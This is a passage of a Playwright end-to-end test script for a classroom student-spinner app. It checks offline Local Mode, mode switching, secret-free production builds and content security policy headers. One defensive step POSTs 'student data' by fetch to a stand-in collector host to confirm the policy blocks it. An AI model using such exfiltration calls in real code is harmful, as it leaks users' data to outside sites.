await step('Local Mode keeps working with the network switched off', async () => {
  await classList().filter({ hasText: 'Period 3 Ecology' }).getByRole('radio').check();
  await lp.getByRole('link', { name: 'Back to spinner' }).click();
  await lp.getByTestId('class-select').waitFor();
  assert.equal(await lp.getByTestId('class-select').locator('option:checked').innerText(), 'Period 3 Ecology');
  await local.setOffline(true);
  try {
    await lp.getByRole('button', { name: 'Load Roster' }).click();
    await lp.getByRole('button', { name: 'Next Spinner' }).click();
    const result = await spinOnce(lp);
    assert.equal(result.student, 'Ada Sample');
    await waitForLogStatus(lp, 'logged');
    await lp.getByRole('link', { name: 'Classes', exact: true }).click();
    await lp.getByTestId('class-list').waitFor();
    await lp.getByLabel('Student name').fill('Fay Mock');
    await lp.getByRole('button', { name: 'Add student' }).click();
    await lp.getByTestId('roster-table').getByLabel('Name of Fay Mock').waitFor();
    await classList().filter({ hasText: 'Period 3 Ecology' }).getByText(/5 students, 7 spins\./).waitFor();
  } finally {
    await local.setOffline(false);
  }
});

await step('the Classes page has accessible names on every control and fits a phone screen', async () => {
  assert.deepEqual(await unnamedControls(lp), []);
  await lp.setViewportSize({ width: 390, height: 844 });
  await lp.waitForTimeout(150);
  const overflow = await lp.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
  assert.ok(overflow <= 1, `the Classes page is ${overflow}px wider than a phone screen`);
  await lp.setViewportSize({ width: 1440, height: 900 });
});

await step('Local Mode made no request to any backend or any other site', async () => {
  assert.deepEqual(foreignRequests(), []);
  assert.equal(mock.state.requests.length, connectedRequests, 'the backend received a request during Local Mode');
  assert.equal(mock.runtime.rows('SpinsLog').length, connectedLogRows, 'a local spin reached the Sheet');
  assert.deepEqual(localErrors, []);
  // Student names never appear in a page address.
  assert.ok(localRequests.every((url) => !/Ada|Sample|Placeholder|example\.com/i.test(decodeURIComponent(url).replace(app.url, ''))));
});

await step('switching to Connected Mode is explicit and copies nothing in either direction', async () => {
  await lp.goto(`${app.url}/classes`);
  await lp.getByTestId('class-list').waitFor();
  const localBefore = JSON.parse((await downloadFrom(lp, () => lp.getByRole('button', { name: 'Back up all classes' }).click())).text);
  const sheetBefore = JSON.stringify([mock.runtime.rows('Roster'), mock.runtime.rows('SpinsLog'), mock.runtime.rows('Settings')]);

  await lp.goto(`${app.url}/admin`);
  await lp.locator('[data-testid="save-settings"]:not([disabled])').waitFor();
  await lp.getByLabel('Backend URL').fill(mock.url);
  await lp.getByLabel('API token', { exact: true }).fill(mock.token);
  await lp.getByTestId('save-connection').click();
  await lp.locator('[data-testid="storage-badge"][data-mode="connected"]').waitFor({ timeout: 10000 });

  // The spinner now shows the Sheet's data and none of the local classes.
  await lp.goto(`${app.url}/spin`);
  await lp.locator('[data-testid="api-status"][data-status="ok"][data-mode="connected"]').waitFor({ timeout: 10000 });
  assert.equal(await lp.getByTestId('class-select').count(), 0);
  await lp.getByRole('button', { name: 'Load Roster' }).click();
  await lp.getByTestId('queue').waitFor();
  assert.deepEqual(await lp.getByTestId('queue').locator('li > span:first-child').allInnerTexts(), ['Ada Sample', 'Ben Placeholder', 'Cy Demo']);
  assert.equal(await lp.getByText('Fay Mock').count(), 0);
  assert.equal(await lp.getByText('Dee Fixture').count(), 0, 'a local-only student appeared in Connected Mode');

  // The Sheet received no local data, and the local classes are untouched.
  assert.equal(JSON.stringify([mock.runtime.rows('Roster'), mock.runtime.rows('SpinsLog'), mock.runtime.rows('Settings')]), sheetBefore);
  await lp.goto(`${app.url}/classes`);
  await lp.getByTestId('classes-connected-note').waitFor();
  const localDuring = JSON.parse((await downloadFrom(lp, () => lp.getByRole('button', { name: 'Back up all classes' }).click())).text);
  const strip = (file) => file.workspaces.map((w) => ({ ...w, workspace: { ...w.workspace, lastBackupAt: null } }));
  assert.deepEqual(strip(localDuring), strip(localBefore));
  await shot(lp, '15-connected-with-local-classes');

  // Back to Local Mode: the saved connection stays, but is not used.
  await lp.goto(`${app.url}/admin`);
  await lp.getByTestId('use-local').click();
  await lp.locator('[data-testid="storage-badge"][data-mode="local"]').waitFor();
  const requestsBefore = mock.state.requests.length;
  await lp.goto(`${app.url}/spin`);
  await lp.getByTestId('class-select').waitFor();
  await spinOnce(lp);
  await waitForLogStatus(lp, 'logged');
  await lp.waitForTimeout(300);
  assert.equal(mock.state.requests.length, requestsBefore, 'Local Mode used the saved connection');
  assert.equal(JSON.stringify([mock.runtime.rows('Roster'), mock.runtime.rows('SpinsLog'), mock.runtime.rows('Settings')]), sheetBefore);
});

await local.close();
await app.server.close();

// ===========================================================================
// Part C: the production build, served the way vercel.json says
// ===========================================================================
const DIST = join(ARTIFACTS, 'dist-check');
const CANARY_TOKEN = 'canary-token-must-never-be-in-the-build-7f3a9c';
const CANARY_URL = 'https://canary-backend.invalid/exec-must-never-be-in-the-build';

function allFiles(dir) {
  return readdirSync(dir).flatMap((name) => {
    const full = join(dir, name);
    return statSync(full).isDirectory() ? allFiles(full) : [full];
  });
}

/** Minimal stand-in for Vercel's static hosting: filesystem first, then the rewrites, plus the headers. */
function startVercelLike(dir, config) {
  const rules = config.headers.map((rule) => ({ pattern: new RegExp(`^${rule.source}$`), headers: rule.headers }));
  const rewrites = config.rewrites.map((rule) => ({ pattern: new RegExp(`^${rule.source}$`), destination: rule.destination }));
  const types = { '.html': 'text/html; charset=utf-8', '.js': 'text/javascript', '.css': 'text/css', '.svg': 'image/svg+xml', '.json': 'application/json' };
  const server = http.createServer((req, res) => {
    const path = decodeURIComponent(new URL(req.url, 'http://x').pathname);
    let file = join(dir, path);
    if (!file.startsWith(dir) || !existsSync(file) || statSync(file).isDirectory()) {
      const rewrite = rewrites.find((rule) => rule.pattern.test(path));
      if (!rewrite) {
        res.writeHead(404);
        res.end('Not found');
        return;
      }
      file = join(dir, rewrite.destination);
    }
    const headers = { 'Content-Type': types[extname(file)] ?? 'application/octet-stream' };
    for (const rule of rules) {
      if (rule.pattern.test(path)) for (const header of rule.headers) headers[header.key] = header.value;
    }
    res.writeHead(200, headers);
    res.end(readFileSync(file));
  });
  return new Promise((resolve) => server.listen(0, '127.0.0.1', () => resolve({ url: `http://127.0.0.1:${server.address().port}`, close: () => new Promise((done) => server.close(done)) })));
}

let hosted;
await step('the production build succeeds and contains no backend address, token or student data', async () => {
  rmSync(DIST, { recursive: true, force: true });
  // Run the real build command in its own process, exactly as a host such as Vercel would,
  // with the old connection variables set to canary values that must not end up in the output.
  const env = { ...process.env, VITE_SPIN_API_URL: CANARY_URL, VITE_RINGWHEEL_API_TOKEN: CANARY_TOKEN, VITE_SPIN_API_TOKEN: CANARY_TOKEN };
  delete env.NODE_ENV;
  const output = execFileSync(process.execPath, [join(ROOT, 'node_modules/vite/bin/vite.js'), 'build', '--outDir', DIST, '--emptyOutDir'], {
    cwd: ROOT,
    env,
    encoding: 'utf8',
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  assert.match(output, /built in/);
  const files = allFiles(DIST);
  assert.ok(files.some((file) => file.endsWith('index.html')));
  // A build with a missing or empty stylesheet must never pass as a good build.
  const css = files.filter((file) => file.endsWith('.css'));
  assert.equal(css.length, 1);
  assert.ok(statSync(css[0]).size > 10000, `the stylesheet is only ${statSync(css[0]).size} bytes`);
  assert.match(readFileSync(css[0], 'utf8'), /\.ring-rotor\{transform-origin:300px 300px/);
  for (const file of files) {
    const content = readFileSync(file, 'latin1');
    for (const forbidden of [CANARY_TOKEN, CANARY_URL, 'canary-backend', mock.token, 'macros/s/AKfycb', 'VITE_RINGWHEEL_API_TOKEN', 'VITE_SPIN_API', 'Ada Sample', 'example.com', 'nchstx']) {
      assert.ok(!content.includes(forbidden), `${file.replace(DIST, 'dist')} contains "${forbidden}"`);
    }
  }
  hosted = await startVercelLike(DIST, JSON.parse(readFileSync(join(ROOT, 'vercel.json'), 'utf8')));
});

const hostedContext = await browser.newContext({ viewport: { width: 1440, height: 900 }, reducedMotion: 'reduce' });
await hostedContext.addInitScript(() => {
  window.__cspViolations = [];
  document.addEventListener('securitypolicyviolation', (e) => window.__cspViolations.push(`${e.violatedDirective} ${e.blockedURI}`));
});
const hp = await hostedContext.newPage();
const hostedErrors = [];
hp.on('pageerror', (err) => hostedErrors.push(err.message));
hp.on('console', (msg) => {
  if (msg.type() === 'error') hostedErrors.push(msg.text());
});

await step('every route opens directly and survives a refresh on the hosted build', async () => {
  for (const [path, marker] of [
    ['/spin', '[data-testid="ring-wheel"]'],
    ['/classes', '[data-testid="class-list"]'],
    ['/admin', '[data-testid="save-settings"]'],
  ]) {
    const response = await hp.goto(`${hosted.url}${path}`);
    assert.equal(response.status(), 200, `${path} did not load directly`);
    assert.match(response.headers()['content-security-policy'], /connect-src https:\/\/script\.google\.com/);
    assert.equal(response.headers()['referrer-policy'], 'no-referrer');
    await hp.locator(marker).waitFor({ timeout: 10000 });
    const reloaded = await hp.reload();
    assert.equal(reloaded.status(), 200, `${path} did not survive a refresh`);
    await hp.locator(marker).waitFor({ timeout: 10000 });
    assert.ok(hp.url().endsWith(path));
  }
  await hp.goto(`${hosted.url}/some/unknown/page`);
  await hp.getByTestId('ring-wheel').waitFor();
  assert.match(hp.url(), /\/spin$/);
  const asset = await hostedContext.request.get(`${hosted.url}/assets/does-not-exist.js`);
  assert.match(await asset.text(), /<div id="root">/, 'a missing file should fall back to the app, as on Vercel');
});

await step('the hosted build runs Local Mode under its security policy with no violations', async () => {
  await hp.goto(`${hosted.url}/spin`);
  await hp.locator('[data-testid="storage-badge"][data-mode="local"]').waitFor({ timeout: 10000 });
  assert.equal(await hp.getByTestId('auto-test-panel').count(), 0, 'the test harness is showing in a production build');
  const result = await spinOnce(hp);
  await waitForLogStatus(hp, 'logged');
  await assertWheelPointsAt(hp, { region: result.region, taxon: result.taxon, iucn: result.iucn });
  await hp.reload();
  await hp.getByTestId('logged-spins').waitFor({ timeout: 10000 });
  assert.equal(await hp.getByTestId('logged-spins').locator('tbody tr').count(), 1);
  assert.deepEqual(await hp.evaluate(() => window.__cspViolations), []);
  assert.deepEqual(hostedErrors, []);
});

await step('the hosted page cannot send data to its own host or to any other site', async () => {
  const attempt = (url) =>
    hp.evaluate(
      (target) =>
        new Promise((resolve) => {
          document.addEventListener('securitypolicyviolation', (e) => resolve(`${e.violatedDirective} blocked`), { once: true });
          fetch(target, { method: 'POST', body: 'student data' }).then(
            () => resolve('sent'),
            () => setTimeout(() => resolve('failed without a policy report'), 500)
          );
        }),
      url
    );
  assert.equal(await attempt('/api/collect'), 'connect-src blocked');
  assert.equal(await attempt('https://collector.example.net/x'), 'connect-src blocked');
});

await hostedContext.close();
if (hosted) await hosted.close();
await browser.close();
await mock.close();

console.log(results.join('\n'));
if (realIdbScenarios) console.log(`\n${realIdbScenarios} concurrency scenarios ran against the real browser IndexedDB`);
console.log(`\n${results.length - failures - skipped} passed, ${failures} failed${skipped ? `, ${skipped} skipped` : ''}`);
process.exit(failures === 0 ? 0 : 1);
